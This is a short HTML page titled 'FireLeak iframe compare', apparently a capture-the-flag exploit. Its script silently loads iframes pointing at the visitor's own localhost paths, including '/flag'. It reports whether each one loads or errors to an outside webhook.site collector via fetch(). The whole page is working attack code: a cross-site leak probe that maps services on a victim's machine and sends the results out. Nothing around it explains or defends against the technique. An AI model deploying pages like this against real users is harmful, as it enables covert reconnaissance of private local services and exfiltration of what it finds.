<!doctype html>
<html>
<body>
<h1>FireLeak iframe compare</h1>

<script>
const endpoint = "https://webhook.site/5dc1560a-274c-4539-af81-568512041310";

function log(path, ev) {
  fetch(`${endpoint}?kind=iframe-compare&path=${encodeURIComponent(path)}&event=${encodeURIComponent(ev)}`)
    .catch(() => {});
}

function probePath(path) {
  const ifr = document.createElement("iframe");
  ifr.onload = () => log(path, "load");
  ifr.onerror = () => log(path, "error");
  ifr.src = "http://127.0.0.1" + path + "?cb=" + Math.random();
  document.body.appendChild(ifr);
}

probePath("/");
probePath("/flag");
probePath("/doesnotexist");
</script>

</body>
</html>
